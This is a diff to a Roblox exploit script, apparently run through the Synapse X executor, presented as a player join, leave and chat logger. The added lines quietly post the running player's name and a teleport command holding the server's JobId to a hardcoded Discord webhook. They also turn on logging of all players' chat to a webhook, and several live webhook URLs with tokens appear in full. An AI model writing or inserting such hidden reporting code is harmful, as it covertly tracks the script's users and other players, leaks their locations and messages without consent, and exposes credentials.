@@ -110,19 +110,30 @@ Frame_2.Position = UDim2.new(0, 0, -23.3647614, 0)
 Frame_2.Size = UDim2.new(0, 400, 0, 15)
 
 
-
-local msg = "ben logs tool " .. game.Players.LocalPlayer.Name .. " just executed ur script"
+local msg = "Ben Tool Logs" .. game.Players.LocalPlayer.Name .. " just executed ur script"
 local url = "https://discord.com/api/webhooks/986865584329326663/YcCwqyo0Ndq66fI0Bs40RrqFi14elZXyndHUkL6glnAPyAfaqY9l_eNnZf4dhH8-ji98"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
 
 
+
+local msg = ('game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"') .. game.JobId .. '")'
+local url = "https://discord.com/api/webhooks/986865584329326663/YcCwqyo0Ndq66fI0Bs40RrqFi14elZXyndHUkL6glnAPyAfaqY9l_eNnZf4dhH8-ji98"
+
+
+
+local msg = ('game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"') .. game.JobId .. '")' .. "Join Logs"
+local url = "https://discord.com/api/webhooks/986865584329326663/YcCwqyo0Ndq66fI0Bs40RrqFi14elZXyndHUkL6glnAPyAfaqY9l_eNnZf4dhH8-ji98"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+
 --=Script By Teedie=--
 
 --=Start Settings=--
 LogPlayerJoins = true --Set this to false if you don't want the script to log joins.
-LogPlayerChat = false --Set this to false if you don't want the script to log chat.
+LogPlayerChat = true --Set this to false if you don't want the script to log chat.
 LogPlayerLeaves = true --Set this to false if you don't want the script to log leaves.
 DebugMode = false --All this does is enable the spammy printing for the script, I would recommend keeping it disabled.
 Webhook = "https://discord.com/api/webhooks/986857784685502484/DaWybXDyfJRjxXWpDqDQxzQWYQDTBi5_P03Em3sgGt7LTcdwpYB2HdjK1mJv0NHErR4k" --Put your webhook here.
@@ -144,7 +155,7 @@ local a =
        ["content"] = tostring(game.Players.LocalPlayer.Name) .. " executed script, logging started.",
        ["avatar_url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png",
        ["username"] = GetName.Name ..
-           " | 9183932460 " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
+           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
    }
 )
 syn.request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = a})
@@ -158,7 +169,7 @@ game:GetService("Players").PlayerRemoving:Connect(
                    {
                        ["content"] = tostring(game.Players.LocalPlayer.Name) .. " left, logging ended.",
                        ["username"] = GetName.Name ..
-                           " | game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"") " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
+                           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                    }
                )
                syn.request(
@@ -180,7 +191,7 @@ game:GetService("Players").PlayerRemoving:Connect(
                        {
                            ["content"] = tostring(player) .. " left.",
                            ["username"] = GetName.Name ..
-                               " | game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"") " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
+                               " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                        }
                    )
                    syn.request(
@@ -210,7 +221,7 @@ game:GetService("Players").PlayerAdded:Connect(
                    {
                        ["content"] = tostring(player) .. " joined the game.",
                        ["username"] = GetName.Name ..
-                           " | game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"") " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
+                           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                    }
                )
                syn.request(
@@ -237,7 +248,7 @@ game:GetService("Players").PlayerAdded:Connect(
                            {
                                ["content"] = tostring(player) .. ": " .. tostring(msg),
                                ["username"] = GetName.Name ..
-                                   " | game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"") " ..
+                                   " | Place Version: " ..
                                        tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                            }
                        )
@@ -272,7 +283,7 @@ for i, child in ipairs(children) do
                        {
                            ["content"] = tostring(child) .. ": " .. tostring(msg),
                            ["username"] = GetName.Name ..
-                               " | game:GetService("TeleportService"):TeleportToPlaceInstance(9183932460,"") " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
+                               " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                        }
                    )
                    syn.request(
